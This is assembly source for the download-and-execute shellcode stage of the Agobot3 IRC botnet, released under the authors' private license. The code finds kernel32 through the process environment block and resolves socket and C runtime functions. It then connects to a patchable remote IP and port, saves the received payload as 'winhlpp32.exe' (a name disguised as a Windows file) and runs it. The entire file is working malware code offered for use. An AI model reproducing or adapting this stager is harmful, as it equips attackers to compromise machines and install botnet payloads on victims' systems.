; Agobot3 - a modular IRC bot for Win32 / Linux
; Copyright (c) 2004 Ago and the Agobot team
; All rights reserved.
; 
; This is private software, you may redistribute it under the terms of
; the APL(Ago's Private License) which follows:
;   
; Redistribution and use in binary forms, with or without modification,
; are permitted provided that the following conditions are met:
; 1. The name of the author may not be used to endorse or promote products
;    derived from this software without specific prior written permission.
; 2. The binary and source may not be sold and/or given away for free.
; 3. The licensee may only create binaries for his own usage, not for any
;    third parties.
; 4. The person using this sourcecode is a developer of said sourcecode.
; 
; Redistribution and use in source forms, with or without modification,
; are not permitted.
; 
; This license may be changed without prior notice.
; 
; THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
; IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
; OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
; IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
; NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
; DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
; THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
; (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
; THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

BITS 32											; 32bit addressing
ORG 0x0											; for relative jumps etc...

					struc	sockstruc
sin_family:			resw	1
sin_port:			resw	1
sin_addr:			resd	1
sin_zero			resb	8
					endstruc

	jmp data									; jump to data
doit:											; "Its the Sounds of Science..." - Beastie Boys
	pop ebx										; get pointer to data to ebx
	push esi									; backup esi on the stack
	push edi									; backup edi on the stack
	push eax									; backup eax on the stack

	call get_k32								; get proc addresses

	lea esi, [ebx-memaddy+kernel32_dll]			; lea name of kernel32 into esi

	lea edi, [ebx-memaddy+kernel32_gpa]			; lea name of kernel32.GetProcAddress into edi
	mov dword [ebx-memaddy+lpr_size], 0xF		; size of gpa
	call loadproc								; call loadproc	
	mov [ebx-memaddy+gpa_ptr], eax				; store kernel32.GetProcAddress

	lea edi, [ebx-memaddy+kernel32_lla]			; lea name of kernel32.LoadLibraryA into edi
	mov dword [ebx-memaddy+lpr_size], 0xD		; size of lla
	call loadproc								; call loadproc	
	mov [ebx-memaddy+lla_ptr], eax				; store kernel32.LoadLibraryA

	lea edi, [ebx-memaddy+kernel32_sleep]		; lea name of kernel32.Sleep into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+sleep_ptr], eax			; store kernel32.Sleep

	lea edi, [ebx-memaddy+kernel32_ext]			; lea name of kernel32.ExitThread into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+exthread_ptr], eax			; store kernel32.ExitThread

	lea esi, [ebx-memaddy+ws2_32_dll]			; lea name of ws2_32 into esi

	lea edi, [ebx-memaddy+ws2_32_startup]		; lea name of ws2_32.WSAStartup into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+startup_ptr], eax			; store ws2_32.WSAStartup

	lea edi, [ebx-memaddy+ws2_32_socket]		; lea name of ws2_32.socket into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+socket_ptr], eax			; store ws2_32.socket

	lea edi, [ebx-memaddy+ws2_32_connect]		; lea name of ws2_32.connect into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+connect_ptr], eax			; store ws2_32.connect

	lea edi, [ebx-memaddy+ws2_32_recv]			; lea name of ws2_32.recv into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+recv_ptr], eax				; store ws2_32.recv
	
	lea edi, [ebx-memaddy+ws2_32_send]			; lea name of ws2_32.send into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+send_ptr], eax				; store ws2_32.send

	lea edi, [ebx-memaddy+ws2_32_clsock]		; lea name of ws2_32.closesocket into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+clsock_ptr], eax			; store ws2_32.closesocket

	lea esi, [ebx-memaddy+msvcrt_dll]			; lea name of msvcrt into esi

	lea edi, [ebx-memaddy+msvcrt_fopen]			; lea name of msvcrt.fopen into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+fopen_ptr], eax			; store msvcrt.fopen

	lea edi, [ebx-memaddy+msvcrt_fclose]		; lea name of msvcrt.fclose into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+fclose_ptr], eax			; store msvcrt.fclose

	lea edi, [ebx-memaddy+msvcrt_fwrite]		; lea name of msvcrt.fwrite into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+fwrite_ptr], eax			; store msvcrt.fwrite

	lea edi, [ebx-memaddy+msvcrt_memset]		; lea name of msvcrt.memset into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+memset_ptr], eax			; store msvcrt.memset

	lea edi, [ebx-memaddy+msvcrt_malloc]		; lea name of msvcrt.malloc into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+malloc_ptr], eax			; store msvcrt.malloc

	lea edi, [ebx-memaddy+msvcrt_free]			; lea name of msvcrt.free into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+free_ptr], eax				; store msvcrt.free

	lea edi, [ebx-memaddy+msvcrt_system]		; lea name of msvcrt.system into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+system_ptr], eax			; store msvcrt.system

	push ebx									; backup ebx on the stack
	call ftrans									; call file transfer routine
	pop ebx										; restore ebx from the stack
	
	pop eax										; restore eax from the stack
	pop edi										; restore edi from the stack
	pop esi										; restore esi from the stack
	
	call end									; call end
data:
	call doit									; call doit
	memaddy			dd	0						; a variable !
	shell_ip		dd	0x11111111				; the ip to connect to
	shell_port		dw	0x2222					; the port to connect to
	ws2_32_dll		db	"ws2_32", 0				; name of ws2_32.dll
	ws2_32_startup	db	"WSAStartup", 0			; ^---> WSAStartup
	ws2_32_socket	db	"socket", 0				; ^---> socket
	ws2_32_connect	db	"connect", 0			; ^---> connect
	ws2_32_recv		db	"recv", 0				; ^---> recv
	ws2_32_send		db	"send", 0				; ^---> send
	ws2_32_clsock	db	"closesocket", 0		; ^---> closesocket
	startup_ptr		dd	0						; ^---> pointer to WSAStartup
	socket_ptr		dd	0						; ^---> pointer to socket
	connect_ptr		dd	0						; ^---> pointer to connect
	recv_ptr		dd	0						; ^---> pointer to recv
	send_ptr		dd	0						; ^---> pointer to send
	clsock_ptr		dd	0						; ^---> pointer to closesocket
	msvcrt_dll		db	"msvcrt", 0				; name of msvcrt.dll
	msvcrt_fopen	db	"fopen", 0				; ^---> fopen
	msvcrt_fclose	db	"fclose", 0				; ^---> fclose
	msvcrt_fwrite	db	"fwrite", 0				; ^---> fwrite
	msvcrt_memset	db	"memset", 0				; ^---> memset
	msvcrt_malloc	db	"malloc", 0				; ^---> malloc
	msvcrt_free		db	"free", 0				; ^---> free
	msvcrt_system	db	"system", 0				; ^---> system
	fopen_ptr		dd	0						; ^---> pointer to fopen
	fclose_ptr		dd	0						; ^---> pointer to fclose
	fwrite_ptr		dd	0						; ^---> pointer to fwrite
	memset_ptr		dd	0						; ^---> pointer to memset
	malloc_ptr		dd	0						; ^---> pointer to malloc
	free_ptr		dd	0						; ^---> pointer to free
	system_ptr		dd	0						; ^---> pointer to system
	kernel32_dll	db	"kernel32", 0			; name of kernel32.dll
	kernel32_gpa	db	"GetProcAddress", 0		; ^---> GetProcAddress
	kernel32_lla	db	"LoadLibraryA", 0		; ^---> LoadLibraryA
	kernel32_sleep	db	"Sleep", 0				; ^---> Sleep
	kernel32_ext	db	"ExitThread", 0			; ^---> ExitThread
	sleep_ptr		dd	0						; ^---> pointer to Sleep
	exthread_ptr	dd	0						; ^---> pointer to ExitThread
	lla_ptr			dd	0						; ^---> pointer to LoadLibraryA
	gpa_ptr			dd	0						; ^---> pointer to GetProcAddress
	thesocket		dd	0						; the socket
	sockaddr_in:	istruc sockstruc			; the sockaddr_in 
		at sin_family,		dw 0
		at sin_port,		dw 0
		at sin_addr,		dd 0
		at sin_zero,		db 0, 0, 0, 0, 0, 0, 0, 0
	iend
	recvbuf			dd	0						; pointer to recv buffer for ws2_32.recv
	mode_wb			db	"w+b", 0				; wb mode string for msvcrt.fopen
	foutfile		dd	0						; pointer to the output FILE
	filename		db	"winhlpp32.exe", 0		; filename to download to and execute from
	openstr			db	"open", 0				; open string for shell32.ShellExecuteA
	thesizeof		dd	0x16					; sizeof(SOCKADDR_IN) for ws2_32.connect
	wsadata			dd	0						; pointer to the wsadata for ws2_32.WSAStartup
	content_length	dd	0						; length of the data to receive
	content_recvd	dd	0						; length of the data already received
	kernel_base		dd	0						; base address of the kernel
	k32_numnames	dd	0						; number of exports in kernel32
	k32_funcaddr	dd	0						; address of functions in kernel32
	k32_nameaddr	dd	0						; address of names in kernel32
	k32_numords		dd	0						; number of ordinals in kernel32
	loadpr_count	dd	0						; counter for loadproc
	lpr_size		dd	0						; size of string for loadproc
	retry_count		dd	0						; counter for retries
; mygpa:
; 
; loads functions via GetProcAddress
;
; input:
; esi = name of dll
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
mygpa:
	push ecx									; backup ecx
	push edi									; backup edi
	push esi									; backup esi
	
	push esi									; push dll name from esi on the stack
	call dword [ebx-memaddy+lla_ptr]			; call LoadLibraryA
	push eax									; eax -> ecx
	pop ecx										; eax -> ecx
	push edi									; push proc name from edi on the stack
	push ecx									; push handle to library on the stack
	call dword [ebx-memaddy+gpa_ptr]			; call GetProcAddress

	pop esi										; restore esi
	pop edi										; restore edi
	pop ecx										; restore ecx
	
	ret											; return to caller
; loadproc:
;
; loads functions from kernel32
;
; input:
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
loadproc:
	xor eax, eax								; clear eax
	mov [ebx-memaddy+loadpr_count],eax			; set our counter to 0
loadproc_loop:
	mov edx, [ebx-memaddy+loadpr_count]			; edx = our counter in the loop
	cmp edx, [ebx-memaddy+k32_numnames]			; compare it to our limit
	jge loadproc_exit							; if were greater or equal to it exit loop
	inc edx										; else increment the counter
	mov [ebx-memaddy+loadpr_count], edx			; and save it for later
	xor eax, eax								; clear eax
	mov eax, [ebx-memaddy+loadpr_count]			; eax = counter
	shl eax, 0x02								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_nameaddr]			; ecx = AddressOfNames
	add ecx, eax								; ecx = ecx + eax
	mov eax, [ecx]								; eax = pointer from ecx
	add eax, [ebx-memaddy+kernel_base]			; align w/ base addr
	push edi									; backup edi
	push esi									; backup esi
	push ecx									; backup ecx
	mov esi, edi								; esi = address of name to compare to [edi]
	mov edi, eax								; edi = address of name to compare w/
	mov ecx, [ebx-memaddy+lpr_size]				; ecx = the length of our search string
	rep cmpsb									; compare the strings pointed to by edi,esi and repeat this ecx times
	pop ecx										; restore ecx
	pop esi										; restore esi
	pop edi										; restore edi
	jne loadproc_loop							; if not equal goto top of loop else we found the function we want 
	xor eax, eax								; clear eax
	mov eax, [ebx-memaddy+loadpr_count]			; eax = value of our counter, we need this for calculations later
	shl eax, 0x01								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_numords]			; ecx = pointer to ordinals
	add ecx, eax								; add the multiplyed counter to it
	xor eax, eax								; clear eax
	mov ax, word [ecx]							; ax = the ordinal for the function we found
	shl eax, 0x02								; multiply it by 4
	mov ecx, [ebx-memaddy+k32_funcaddr]			; ecx = pointer to address of functions
	add eax, ecx								; add it to (ordinal*4)
	mov ecx, [eax]								; ecx = rva of function
	add ecx, [ebx-memaddy+kernel_base]			; align it, ecx = va of function
	mov eax, ecx								; move it to eax
	ret											; return to caller

loadproc_exit
	xor eax, eax								; clear eax
	ret											; return to caller

get_k32_exit:
	jmp exit									; exit

get_k32_9x:
	mov eax, [ds:eax+0x34]						; get Win9x PEB
	mov ebp, [ds:eax+0xb8]						; same here
	jmp get_k32_cont							; return to get_k32

get_k32:
	push eax									; backup eax
	push ecx									; backup ecx
	push esi									; backup esi
	push ebp									; backup ebp

	mov eax, [fs:0x30]							; get the PEB into eax
	test eax, eax								; detect Win9x PEB
	js get_k32_9x								; get the Win9x PEB

get_k32_cont:
	mov eax, [ds:eax+0xC]						; get PROCESS_MODULE_INFO addr
	mov esi, [ds:eax+0x1C]						; get InInitOrder.flink
	lodsd										; get InInitOrder.blink
	mov ebp, [ds:eax+0x8]						; get the kernel base
	mov [ebx-memaddy+kernel_base], ebp			; store the kernel base
	mov eax, ebp								; move it to eax

	cmp word [eax], 'MZ'						; check if we have a exe image
	jne get_k32_exit							; exit if we dont
	add eax, 0x3C								; eax = pointer to pe header offset
	mov ecx, [eax]								; get the pointer
	add ecx, [ebx-memaddy+kernel_base]			; add image base to align it

	cmp word [ecx], 'PE'						; check if we have a pe image
	jne get_k32_exit							; exit if we dont
	add ecx, 0x78								; ecx = pointer to virtual address of export dir address
	mov esi, [ecx]								; esi = virtual address of export dir address
	add esi, [ebx-memaddy+kernel_base]			; add image base to align it

	add esi, 0x18								; esi points to NumberOfNames
	lodsd										; load number of names into eax
	mov [ebx-memaddy+k32_numnames], eax			; save it for later

	lodsd										; load address of funcs into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_funcaddr], eax			; save it

	lodsd										; load address of names into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_nameaddr], eax			; save it

	lodsd										; load number of ordinals into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_numords], eax			; save it

	pop ebp										; restore ebp
	pop esi										; restore esi
	pop ecx										; restore ecx
	pop eax										; restore eax

	ret											; return to caller
ftrans:
	push eax									; backup eax on the stack
	mov eax, 0x400								; request 1024 bytes
	call malloc									; call malloc
	cmp eax, 0									; compare return value
	je near ftrans								; retry if NULL
	mov [ebx-memaddy+wsadata], eax				; backup wsadata in a var
	pop eax										; restore eax from the stack

ftrans_wsastart:
	; ws2_32.WSAStartup(wVersionRequired, lpWSAData);
	mov edx, [ebx-memaddy+wsadata]				; get wsadata
	push edx									; push it !
	push 0x101									; request version 1
	call dword [ds:ebx-memaddy+startup_ptr]		; call ws2_32.WSAStartup
	cmp eax, 0									; compare return value
	jne near ftrans_wsastart					; retry if lower

ftrans_socket:	
	; ws2_32.socket(af, type, protocol);
	push 0x6									; protocol=IPPROTO_TCP
	push 0x1									; type=SOCK_STREAM
	push 0x2									; af=AF_INET
	call dword [ds:ebx-memaddy+socket_ptr]		; call ws2_32.socket
	cmp eax, 0xffffffff							; compare return value
	jz near ftrans_socket						; retry if zero
	mov [ebx-memaddy+thesocket], eax			; copy socket

	push edi									; backup edi on the stack
	push eax									; backup eax on the stack
	push ebx									; backup ebx on the stack
ftrans_connect:
	; ws2_32.connect(s, name, namelen)
	lea edx, [ebx-memaddy+thesizeof]			; get sizeof
	mov byte [edx], 0x16						; make it 0x16
	push edx									; push it !
	lea edx, [ebx-memaddy+sockaddr_in]			; get sockaddr_in
	mov word [edx+sin_family], 0x0002			; sockaddr_in->sin_family=AF_INET
	mov di, [ebx-memaddy+shell_port]			; get shell_port
	mov word [edx+sin_port], di					; sockaddr_in->sin_port=<userdata:word>
	mov edi, [ebx-memaddy+shell_ip]				; get shell_ip
	mov dword [edx+sin_addr], edi				; sockaddr_in->sin_addr=<userdata:dword>
	push edx									; push it !
	mov eax, [ebx-memaddy+thesocket]			; get socket
	push eax									; push the socket onto the stack
	call dword [ds:ebx-memaddy+connect_ptr]		; call ws2_32.connect
	cmp eax, 0									; compare return value
	jl near ftrans_connect						; retry if lower
	pop ebx										; restore ebx from the stack
	pop eax										; restore eax from the stack
	pop edi										; restore edi from the stack

ftrans_malloc_2:
	push eax									; backup eax on the stack
	mov eax, 0x1000								; want 4096 bytes from malloc
	call malloc									; allocate space for recv
	cmp eax, 0									; compare return value
	je near ftrans_malloc_2						; retry if NULL
	mov [ebx-memaddy+recvbuf], eax				; save address of recvbuf
	pop eax										; restore eax from the stack
	
	call get_size								; call get_size
	call open_file								; call open_file
	call do_recv								; call do_recv
	
	call exec_file								; execute the file
	
	ret											; return to caller

ftrans_error_retry:
	mov eax, [ebx-memaddy+thesocket]			; get socket
	push eax									; push it !
	call dword [ds:ebx-memaddy+clsock_ptr]		; call ws2_32.closesocket
	mov eax, [ebx-memaddy+retry_count]			; get retry count
	inc eax										; increment it
	mov [ebx-memaddy+retry_count], eax			; store it again
	cmp eax, 5									; compare it to 5
	je near ftrans_error_end					; fail if 5 retries reached
	jmp ftrans_socket							; restart file transfer

ftrans_error_end:
	ret											; return to caller

get_size:
	; ws2_32.recv(s, buf, length, flags);
	push 0x0									; flags=NULL
	push 0x4									; length=0x4
	lea edx, [ebx-memaddy+content_length]		; get content_length
	push edx									; push it !
	mov edx, [ebx-memaddy+thesocket]			; get the socket
	push edx									; push it !
	call dword [ds:ebx-memaddy+recv_ptr]		; call ws2_32.recv
	cmp eax, 1									; compare return value
	jl near ftrans_error_retry					; retry if lower
	ret											; return to caller
do_recv:
	push edi									; backup edi
	push esi									; backup esi
	mov edi, [ebx-memaddy+content_length]		; get content_length
	mov esi, [ebx-memaddy+content_recvd]		; get content_recvd
	cmp dword edi, esi							; compare the byte counters
	pop esi										; restore esi
	pop edi										; restore edi
	je near recv_end							; return to caller if equal

	; ws2_32.recv(s, buf, length, flags);
	push 0x0									; flags=NULL
	push 0x400									; length=1024
	mov edx, [ebx-memaddy+recvbuf]				; get recvbuf
	push edx									; push it !
	mov edx, [ebx-memaddy+thesocket]			; get the socket
	push edx									; push it !
	call dword [ds:ebx-memaddy+recv_ptr]		; call ws2_32.recv
	cmp eax, 1									; compare return value
	jl near ftrans_error_retry					; retry if lower

	add [ebx-memaddy+content_recvd], eax		; add eax to the length of content received
	
	jmp write_file								; jump to write_file
recv_end:
	call close_file								; call close_file
	; ws2_32.closesocket(s)
	push eax									; backup eax
	mov eax, [ebx-memaddy+thesocket]			; get the socket
	push eax									; push the socket onto the stack
	call dword [ds:ebx-memaddy+clsock_ptr]		; call ws2_32.closesocket
	pop eax										; restore eax
	ret											; return to caller
malloc:
	mov edi, eax								; move eax into edi
	push eax									; size=xx bytes
	call dword [ds:ebx-memaddy+malloc_ptr]		; call malloc
	pop edi										; clean the stack
	
	push eax									; backup eax on the stack
	
	push edi									; size=xx bytes
	push 0x0									; fill with nulls
	push eax									; the string
	call dword [ds:ebx-memaddy+memset_ptr]		; call memset
	pop edi										; clean the stack
	pop edi										; clean the stack
	pop edi										; clean the stack
	
	pop eax										; restore eax from the stack
	
	ret	
open_file:
	lea edx, [ebx-memaddy+mode_wb]				; get wb mode string
	push edx									; push it !
	lea edx, [ebx-memaddy+filename]				; get sydir string
	push edx									; push it !
	call dword [ds:ebx-memaddy+fopen_ptr]		; call msvcrt.fopen
	pop edi										; clean up stack
	pop edi										; clean up stack
	mov [ebx-memaddy+foutfile], eax				; store FILE pointer
	ret											; return to caller
write_file:
	push dword [ebx-memaddy+foutfile]			; push FILE pointer on the stack
	push eax									; push size of read data
	push 0x1									; push size per element of 1 byte
	mov edx, [ebx-memaddy+recvbuf]				; get recvbuf
	push edx									; push it !
	call dword [ds:ebx-memaddy+fwrite_ptr]		; call msvcrt.fwrite	
	pop edi										; clean up stack
	pop edi										; clean up stack
	pop edi										; clean up stack
	pop edi										; clean up stack
	jmp do_recv									; jump to do_recv
close_file:
	mov edx, [ebx-memaddy+foutfile]				; get FILE pointer
	push edx									; push it !
	call dword [ds:ebx-memaddy+fclose_ptr]		; call msvcrt.fclose
	pop edi										; clean up stack
	ret											; return to caller
exec_file:
	; msvcrt.system(filename);
	push eax									; backup eax
	lea eax, [ebx-memaddy+filename]				; get filename
	push eax									; push it !

	call dword [ds:ebx-memaddy+system_ptr]		; call msvcrt.system

	pop eax										; pop ret !
	pop eax										; restore eax
	leave										; leave
	ret											; return to caller
end:
	call close_file								; call close_file
exit:
	push 0x0									; dwExitCode=0
	call [ebx-memaddy+exthread_ptr]				; call kernel32.ExitThread
	nop											; nop nop nop
